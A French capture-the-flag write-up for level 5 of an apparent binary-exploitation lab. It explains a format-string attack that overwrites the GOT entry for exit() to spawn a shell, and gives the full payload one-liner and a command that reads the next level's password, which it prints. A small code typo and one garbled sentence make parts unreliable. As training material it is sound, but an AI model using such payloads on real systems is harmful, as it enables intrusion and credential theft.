# Level 5

Voici le code source de ce niveau:

```C
#include <stdio.h>
#include <stdlib.h>

void o(void)
{
    system("/bin/sh")
    _exit(1);
}

void n(void)
{
    char buff[520];

    fgets(buff, 512, stdin);
    printf(buff);
    exit(1);
}

void main(void)
{
    n();
    return;
}
```

Le probleme dans ce niveau c'est que la fonction `n()` ne n'utilise pas de mot clef `return` donc nous ne pouvons pas ecraser l'adresse de retour pour utiliser celle de `o()`. Par contre nous pouvons remplacer l'adresse de `exit()` dans la GOT (Global Offset Table) pour la remplacer par celle de `o()`.

Nous avons donc besoin de l'adresse de `exit()`:

```bash
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

Ceci nous donne l'adresse de `exit()`: `08049838`. Nous savons donc que nous devons ecraser la valeur a cette adresse. Grace a Ghidra nous pouvons voir que l'adresse de `o()` est `080484a4`

En utilisant le meme principe que la partie precedente et en convertissant `` en decimale nous pouvons construire cette commande: `080484a4`

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' ; cat) | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
